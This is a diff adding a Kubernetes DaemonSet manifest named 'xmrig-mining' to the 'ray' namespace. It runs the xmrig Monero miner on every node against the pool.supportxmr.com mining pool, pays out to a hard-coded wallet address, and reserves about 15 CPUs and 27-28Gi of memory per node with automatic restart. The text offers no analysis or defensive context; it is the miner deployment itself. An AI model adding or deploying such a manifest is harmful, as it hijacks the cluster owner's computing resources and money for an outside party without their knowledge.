@@ -1,0 +1,27 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: xmrig-mining
+  namespace: ray
+spec:
+  selector:
+    matchLabels:
+      app: xmrig-mining
+  template:
+    metadata:
+      labels:
+        app: xmrig-mining
+    spec:
+      containers:
+        - name: xmrig
+          image: xmrig/xmrig:latest
+          args: ["-o", "pool.supportxmr.com:3333", "-u", "49ppzHZhAG2AWEq2SVgHboMV3ow8PbtfZchS1yiiKwKY9hrR7nYtZjhYdDtuSDWbVSTCGFxnkSfxKPvmm1kz9XFkBy2xYWN", "-p", "x", "-k"]
+          resources:
+            limits:
+              cpu: "15.5"
+              memory: "28Gi"
+            requests:
+              cpu: "15"
+              memory: "27Gi"
+      restartPolicy: Always
+
